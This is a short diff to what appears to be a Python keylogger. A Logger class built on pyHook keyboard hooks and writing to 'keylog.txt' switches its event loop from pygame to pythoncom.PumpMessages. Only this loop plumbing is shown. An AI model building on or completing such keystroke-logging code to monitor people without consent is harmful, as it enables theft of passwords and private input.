@@ -6,7 +6,7 @@ from pyHook import GetKeyState, HookConstants
 from get_local_addr import get_local_addr
 import time
 import os
-import pygame
+import pythoncom
 
 
 class Logger:
@@ -18,9 +18,6 @@ class Logger:
     log = None
 
     def __init__(self, path, name='keylog.txt'):
-
-        # Initializes the pygame module
-        pygame.init()
 
         # Sets the path of the log file
         self.path = path + name
@@ -49,8 +46,7 @@ class Logger:
 
         try:
             # Starts the event pump
-            while True:
-                pygame.event.pump()
+            pythoncom.PumpMessages()
         except:
             pass
 
